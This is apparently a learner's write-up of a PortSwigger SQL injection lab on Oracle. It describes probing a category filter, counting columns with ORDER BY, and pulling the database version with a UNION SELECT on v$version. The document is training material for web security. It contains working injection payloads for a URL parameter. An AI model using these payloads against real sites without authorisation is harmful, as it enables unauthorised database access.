# [SQL injection attack, querying the database type and version on Oracle] — [PortSwigger] — [Practitioner]
**Date:** 2026-05-28
 
---
 
## Vulnerability / core concept
 SQL injection attack

## What made me stuck
Whenever I tried to write `UNION SELECT` I was getting `Internal Server Error`. After a few tries I realized that I am skipping very basic but important concept: number of colums should be equal to make query work.
 
## What unblocked me
I used `ORDER BY` command to find the number of columns in first `SELECT`. To do so, I tried several options:
```sql
/filter?category=Accessories' ORDER BY 1 -- (worked)
/filter?category=Accessories' ORDER BY 2 -- (worked)
/filter?category=Accessories' ORDER BY 3 -- (error)
```
After getting error, we confirmed the number of columns that exist in first `SELECT`.

---


## Attack path
1) Use `'` to see how web app reacts.
2) Use both `'1'='1` and `'1'='2` to check how web application reacts to these. If we get error or empty list (any difference, doesn't matter) on web app, we confirm SQLi
3) Use `ORDER BY` to determine the number of the columns
4) Use `SELECT banner, null from v$version --` to retrieve DBMS version (null is used to match number of columns)


---


## Payload / key command
```bash
/filter?category=Accessories' union select banner, null from v$version --
```

---


## What I'd recognize faster next time
Next time after confirming SQL injection I will check the number of columns in the query. Later on, I can also check the type of the column using commands such as `SELECT null, "test", null ...` (This command checks whether second column is type of string).

